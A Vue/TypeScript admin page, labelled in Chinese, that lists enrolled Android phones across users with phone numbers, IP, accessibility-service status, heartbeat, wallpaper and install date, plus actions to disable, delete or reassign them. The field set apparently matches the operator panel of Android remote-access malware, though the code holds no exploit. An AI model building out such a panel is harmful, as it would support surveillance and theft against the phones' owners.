<script setup lang="ts">
import { onMounted, reactive, ref } from 'vue'
import { useRouter } from 'vue-router'
import { Modal, message } from 'ant-design-vue'
import { ReloadOutlined, EyeOutlined } from '@ant-design/icons-vue'
import PageContainer from '#/layouts/components/PageContainer.vue'
import ReassignDialog from './ReassignDialog.vue'
import RemarkDialog from './RemarkDialog.vue'
import { fetchDevices, removeDevice, toggleDevice } from '#/api/devices'
import type { DeviceListItem } from '#/types/device'
import { apiError } from '#/api/http'

const router = useRouter()

const list = ref<DeviceListItem[]>([])
const total = ref(0)
const loading = ref(false)
const page = ref(1)
const pageSize = ref(20)
const pendingId = ref<string>('')

const filter = reactive({
  usrname: '',
  phone_name: '',
  country: '',
  model: '',
  accessibility: undefined as string | undefined,
  install_date: '',
})

const columns = [
  { title: 'phone_id', dataIndex: 'phone_id', key: 'phone_id', width: 180, ellipsis: true },
  { title: '归属', dataIndex: 'usrname', key: 'usrname', width: 130 },
  { title: '设备名', dataIndex: 'phone_name', key: 'phone_name', width: 160 },
  { title: '型号', dataIndex: 'model', key: 'model', width: 140 },
  { title: '系统', dataIndex: 'android_ver', key: 'android_ver', width: 80 },
  { title: '电话号码', dataIndex: 'phonenumber', key: 'phonenumber', width: 130 },
  { title: '国家', dataIndex: 'country', key: 'country', width: 90 },
  { title: 'IP', dataIndex: 'address', key: 'address', width: 130 },
  { title: '电量', dataIndex: 'battery_charg', key: 'battery_charg', width: 70 },
  { title: '网络', dataIndex: 'network', key: 'network', width: 100 },
  { title: '无障碍', key: 'accessibility', width: 80 },
  { title: '活动', dataIndex: 'activities', key: 'activities', width: 70, ellipsis: true },
  { title: '壁纸', key: 'wallpaper', width: 60 },
  { title: '安装日期', dataIndex: 'install_date', key: 'install_date', width: 120 },
  { title: '最后心跳', dataIndex: 'last_ping', key: 'last_ping', width: 160 },
  { title: '状态', key: 'phoneopen', width: 90 },
  { title: '操作', key: 'actions', width: 330, fixed: 'right' as const },
]

async function load() {
  loading.value = true
  try {
    const res = await fetchDevices({
      page: page.value,
      pageSize: pageSize.value,
      usrname: filter.usrname || undefined,
      phone_name: filter.phone_name || undefined,
      country: filter.country || undefined,
      model: filter.model || undefined,
      accessibility: filter.accessibility,
      install_date: filter.install_date || undefined,
    })
    list.value = res.data
    total.value = res.total
  } catch (err) {
    message.error(apiError(err, '加载设备失败'))
  } finally {
    loading.value = false
  }
}

onMounted(load)

function onPageChange(p: number, size: number) {
  page.value = p
  pageSize.value = size
  load()
}

function onSearch() {
  page.value = 1
  load()
}

function resetFilter() {
  filter.usrname = ''
  filter.phone_name = ''
  filter.country = ''
  filter.model = ''
  filter.accessibility = undefined
  filter.install_date = ''
  page.value = 1
  load()
}

async function onToggle(row: DeviceListItem) {
  pendingId.value = row.phone_id
  try {
    const next = row.phoneopen ? 0 : 1
    const res = await toggleDevice(row.phone_id, next as 0 | 1)
    if (res.error) throw new Error(res.error)
    message.success(next ? '已启用' : '已禁用')
    row.phoneopen = next
  } catch (err) {
    message.error(apiError(err, '操作失败'))
  } finally {
    pendingId.value = ''
  }
}

function onRemove(row: DeviceListItem) {
  Modal.confirm({
    title: `删除设备 ${row.phone_id}?`,
    content: '此操作不可恢复。',
    okText: '删除', okButtonProps: { danger: true }, cancelText: '取消',
    async onOk() {
      try {
        const res = await removeDevice(row.phone_id)
        if (res.error) throw new Error(res.error)
        message.success('已删除')
        load()
      } catch (err) {
        message.error(apiError(err, '删除失败'))
      }
    },
  })
}

const reassignTarget = ref<DeviceListItem | null>(null)
const remarkTarget = ref<DeviceListItem | null>(null)

function gotoDetail(row: DeviceListItem) {
  router.push({ name: 'device-detail', params: { phoneId: row.phone_id } })
}
</script>

<template>
  <PageContainer title="全部设备" subtitle="管理员视角：所有用户的设备汇总">
    <template #extra>
      <a-button :loading="loading" @click="load">
        <ReloadOutlined /> 刷新
      </a-button>
    </template>

    <a-form layout="inline" class="filter-bar">
      <a-form-item label="归属用户">
        <a-input v-model:value="filter.usrname" allow-clear placeholder="usrname" />
      </a-form-item>
      <a-form-item label="设备名">
        <a-input v-model:value="filter.phone_name" allow-clear placeholder="phone_name" />
      </a-form-item>
      <a-form-item label="国家">
        <a-input v-model:value="filter.country" allow-clear placeholder="US / CN ..." style="width: 100px" />
      </a-form-item>
      <a-form-item label="型号">
        <a-input v-model:value="filter.model" allow-clear placeholder="Pixel / Mi ..." />
      </a-form-item>
      <a-form-item label="无障碍">
        <a-select
          v-model:value="filter.accessibility"
          allow-clear
          placeholder="全部"
          style="width: 100px"
          :options="[
            { value: '1', label: '已开启' },
            { value: '0', label: '未开启' },
          ]"
        />
      </a-form-item>
      <a-form-item label="安装日期">
        <a-input v-model:value="filter.install_date" allow-clear placeholder="2026-05" style="width: 120px" />
      </a-form-item>
      <a-form-item>
        <a-space>
          <a-button type="primary" @click="onSearch">筛选</a-button>
          <a-button @click="resetFilter">重置</a-button>
        </a-space>
      </a-form-item>
    </a-form>

    <a-table
      :columns="columns"
      :data-source="list"
      :loading="loading"
      :pagination="{
        current: page,
        pageSize,
        total,
        showSizeChanger: true,
        onChange: onPageChange,
        onShowSizeChange: onPageChange,
        showTotal: (t: number) => `共 ${t} 台`,
      }"
      row-key="phone_id"
      size="middle"
      :scroll="{ x: 2100 }"
    >
      <template #bodyCell="{ column, record }">
        <template v-if="column.key === 'wallpaper'">
          <a-avatar v-if="record.wallpaper" :src="record.wallpaper" shape="square" :size="36" />
          <span v-else>—</span>
        </template>
        <template v-else-if="column.key === 'accessibility'">
          <a-tag v-if="String(record.accessibility) === '1'" color="green">已开启</a-tag>
          <a-tag v-else color="default">未开启</a-tag>
        </template>
        <template v-else-if="column.key === 'phoneopen'">
          <a-tag v-if="record.phoneopen" color="blue">已启用</a-tag>
          <a-tag v-else color="orange">已禁用</a-tag>
        </template>
        <template v-else-if="column.key === 'actions'">
          <a-space wrap>
            <a-button size="small" type="link" @click="gotoDetail(record)">
              <EyeOutlined /> 详情
            </a-button>
            <a-button size="small" type="link" @click="remarkTarget = record">备注</a-button>
            <a-button size="small" type="link" @click="reassignTarget = record">指派</a-button>
            <a-button
              size="small"
              type="link"
              :loading="pendingId === record.phone_id"
              @click="onToggle(record)"
            >
              {{ record.phoneopen ? '禁用' : '启用' }}
            </a-button>
            <a-button size="small" type="link" danger @click="onRemove(record)">删除</a-button>
          </a-space>
        </template>
      </template>
    </a-table>

    <ReassignDialog
      v-if="reassignTarget"
      :device="reassignTarget"
      @close="reassignTarget = null"
      @done="reassignTarget = null; load()"
    />
    <RemarkDialog
      v-if="remarkTarget"
      :device="remarkTarget"
      @close="remarkTarget = null"
      @done="remarkTarget = null; load()"
    />
  </PageContainer>
</template>

<style scoped>
.filter-bar {
  margin-bottom: 16px;
  padding: 14px 16px;
  background: var(--bg-2);
  border-radius: var(--radius-md);
}
</style>
